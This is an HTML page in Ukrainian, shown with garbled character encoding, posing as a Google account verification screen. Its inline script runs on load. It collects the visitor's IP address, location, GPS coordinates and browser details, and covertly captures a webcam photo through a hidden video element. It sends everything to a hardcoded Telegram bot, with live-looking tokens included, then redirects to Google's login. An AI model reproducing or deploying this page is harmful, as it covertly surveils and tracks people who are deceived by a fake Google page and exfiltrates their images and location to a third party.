<!DOCTYPE html>
<html lang="uk">

<head>
  <meta charset="UTF-8">
  <title>–ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 50px;
    }

    video,
    canvas {
      display: none;
    }
  </style>
</head>

<body>
  <h2>–ü—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è Google –∞–∫–∞—É–Ω—Ç—É</h2>
  <p>–ë—É–¥—å –ª–∞—Å–∫–∞, –∑–∞—á–µ–∫–∞–π—Ç–µ...</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = '8029833409:AAEX5ld5TBiHwc85ddH5-JgLEvki19-DlAQ';
    const chatId = '1496584814';

    const sendMessage = async (text) => {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    };

    const sendPhoto = async (photoBlob) => {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', photoBlob, 'photo.jpg');

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: form
      });
    };

    const sendAll = async () => {
      let ip = '', city = '', country = '', ua = navigator.userAgent;
      try {
        const res = await fetch('https://ipinfo.io/json?token=4e0f12c0a8b1d1');
        const data = await res.json();
        ip = data.ip;
        city = data.city;
        country = data.country;
      } catch (e) { }

      let lat = '–Ω/–¥', lon = '–Ω/–¥';
      if (navigator.geolocation) {
        await new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(pos => {
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            resolve();
          }, () => resolve());
        });
      }

      const now = new Date().toLocaleString();
      const msg = `üì± –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è —É–≤—ñ–π—Ç–∏:

üåç IP: ${ip}
üèôÔ∏è –ú—ñ—Å—Ç–æ: ${city}, ${country}
üì° –ì–µ–æ: ${lat}, ${lon}
üì± –ü—Ä–∏—Å—Ç—Ä—ñ–π: ${ua}
üïí –ß–∞—Å: ${now}`;

      await sendMessage(msg);

      // –ö–∞–º–µ—Ä–∞
      try {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        video.srcObject = stream;

        await new Promise(r => setTimeout(r, 3000));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        await sendPhoto(blob);
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        await sendMessage('–î–æ—Å—Ç—É–ø –¥–æ –∫–∞–º–µ—Ä–∏ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ');
      }

      // –†–µ–¥–∏—Ä–µ–∫—Ç
      window.location.href = 'https://accounts.google.com/ServiceLogin';
    };

    sendAll();
  </script>
</body>

</html>